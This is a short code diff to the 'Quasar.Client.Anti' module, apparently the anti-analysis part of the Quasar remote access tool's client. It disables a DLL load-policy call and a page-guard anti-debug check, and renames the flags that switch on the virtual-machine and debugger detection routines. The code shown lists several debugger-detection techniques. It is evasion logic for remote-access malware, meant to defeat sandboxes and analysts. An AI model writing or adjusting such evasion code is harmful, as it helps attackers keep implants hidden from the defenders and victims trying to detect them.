@@ -48,7 +48,7 @@ namespace Quasar.Client.Anti
 
         private static void CheckInjection()
         {
-            AntiInjection.SetDllLoadPolicy();
+            //AntiInjection.SetDllLoadPolicy();
 
             while (true)
             {
@@ -88,7 +88,7 @@ namespace Quasar.Client.Anti
                             AntiDebug.BeingDebuggedCheck,
                             AntiDebug.NtGlobalFlagCheck,
                             AntiDebug.NtSetDebugFilterStateAntiDebug,
-                            AntiDebug.PageGuardAntiDebug,
+                            //AntiDebug.PageGuardAntiDebug,
                             AntiDebug.NtQueryInformationProcessCheck_ProcessDebugFlags,
                             AntiDebug.NtQueryInformationProcessCheck_ProcessDebugPort,
                             AntiDebug.NtQueryInformationProcessCheck_ProcessDebugObjectHandle,
@@ -114,12 +114,12 @@ namespace Quasar.Client.Anti
 
         public static void StartAnti()
         {
-            if (Settings.AntiVM)
+            if (Settings.ANTIVM)
             {
                 Debug.WriteLine("Checking for virtualization...");
                 CheckVirtualization();
             }
-            if (Settings.AntiDebug)
+            if (Settings.ANTIDEBUG)
             {
                 Debug.WriteLine("Checking for debugger...");
                 //CheckInjection();
